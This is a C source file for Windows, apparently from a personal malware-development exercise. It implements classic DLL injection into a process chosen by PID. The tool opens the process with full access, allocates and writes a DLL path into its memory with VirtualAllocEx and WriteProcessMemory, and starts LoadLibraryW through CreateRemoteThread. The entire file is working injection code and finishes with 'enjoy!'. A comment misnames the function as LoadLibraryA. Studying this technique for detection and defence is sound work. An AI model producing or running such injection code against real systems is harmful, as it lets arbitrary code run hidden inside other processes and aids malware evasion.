#include <windows.h>
#include <stdio.h>

char k[4] = "(+)";
char i[4] = "(*)";
char e[4] = "(-)";

PVOID rBuffer;
HANDLE hProcess;
wchar_t dllLocation[MAX_PATH] = L"C:\\Users\\baile\\Desktop\\TEST\\maldev\\Process Injection\\DLL Injection\\dllinjection.dll";
size_t dllPath = sizeof(dllLocation);

int main(int argc, char* argv[]) {

    if (argc < 2) {
        printf("%s usage: dllinjection.exe <pid>", e);
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (!hProcess || hProcess == NULL) {
        printf("%s could not create handle to process [%d]", e, PID);
        return EXIT_FAILURE;
    }

    printf("%s created handle to process [%d]\n", k, PID);
    printf("%s allocating memory within process...\n", i);

    rBuffer = VirtualAllocEx(hProcess, rBuffer, dllPath, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

    printf("%s allocated space within process\n\n", k);
    printf("\t%s VirtualAllocEx() [flProtect -> PAGE_READWRITE]\n", i);
    printf("\t%s VirtualAllocEx() [flAllocationType -> MEM_COMMIT | MEM_RESERVE]\n\n", i);
    printf("%s writing to process memory...\n", i);

    WriteProcessMemory(hProcess, rBuffer, (LPVOID)dllLocation, dllPath, NULL);

    printf("%s wrote to process memory\n\n", k);
    printf("\t%s getting library [LoadLibraryW() -> Kernel32] address...\n", i);
    printf("\t%s starting PTHREAD_START_ROUTINE...\n\n", i);

    PTHREAD_START_ROUTINE startRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW"); // get handle of Kernel32, then look for LoadLibraryA()

    printf("%s PTHREAD_START_ROUTINE done, loading library address done\n", k);
    
    printf("%s creating remote thread...\n", i);
    CreateRemoteThread(hProcess, NULL, 0, startRoutine, rBuffer, 0, NULL);

    printf("%s thread created, enjoy!\n", k);
    printf("%s closing handle to process...\n", i);

    CloseHandle(hProcess);

    printf("%s finished", k);

    return EXIT_SUCCESS;

}